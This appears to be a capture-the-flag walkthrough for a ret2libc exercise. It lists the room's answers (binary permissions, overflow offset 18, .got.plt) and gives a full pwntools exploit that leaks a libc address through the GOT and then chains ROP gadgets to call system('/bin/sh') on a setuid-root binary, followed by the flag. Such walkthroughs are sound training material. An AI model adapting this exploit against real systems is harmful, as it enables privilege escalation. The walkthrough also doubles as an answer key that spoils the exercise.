# ret2libc

### Introduction
- What is the name of the function which is essential for ret2libc attack? `system`

### Review of the binary
- What are the permissions of the exploit_me binary?<br />
![image](https://github.com/user-attachments/assets/e60d1fc6-5b0a-40d5-bdf7-a0b59103dc5f)<br />
`-rwsrwxr-x 1 root root`
- At which address will exploit_me binary start?<br />
PIE is disabled, which means that our binary will always start at the address 0x400000 and won't be affected by ASLR.<br />
`0x400000`
(PIE disabled means that ASLR won't affect this binary, yet ASLR is still enabled on this system, but the thing which is being affected is the libc, which is dynamically linked to our binary and is mandatory for our ret2libc attack to work)<br />
- What is the overflow offset that we found in gdb?<br />
![image](https://github.com/user-attachments/assets/296a06c4-803a-4eb0-9f84-6eb5adf6306e)<br />
`18`

### ASLR & GOT
- What is the name of the section of the binary which is important for our leak?<br /> `.got.plt`

### Examining in the Ghidra
- What is the name of the function that is under gets in .got.plt?<br />
`setuid`

### Creating the exploit
- What is the flag?<br />
Execute the following python code:

      #!/usr/bin/env python3
      from pwn import *
      
      context.binary = binary = './exploit_me'
      elf = ELF(binary)
      rop = ROP(elf)
      
      libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
      
      p = process()
      
      padding = b'A'*18
      payload = padding
      payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
      payload += p64(elf.got.gets)
      payload += p64(elf.plt.puts)
      payload += p64(elf.symbols.main)
      
      p.recvline()
      p.sendline(payload)
      p.recvline()
      leak = u64(p.recvline().strip().ljust(8,b'\0'))
      p.recvline()
      
      log.info(f'Gets leak => {hex(leak)}')
      libc.address = leak - libc.symbols.gets
      log.info(f'Libc base => {hex(libc.address)}')
      
      payload = padding
      payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
      payload += p64(next(libc.search(b'/bin/sh')))
      payload += p64(rop.find_gadget(['ret'])[0])
      payload += p64(libc.symbols.system)
      
      p.sendline(payload)
      p.recvline()
      p.interactive()

![image](https://github.com/user-attachments/assets/f173ec6f-f080-45a8-ad4f-beeb94815ca6)<br />
`thm{dGhlIG1vc3QgcmFuZG9tIHZhbHVlIHlvdSBjb3VsZCBldmVyIGd1ZXNz}`
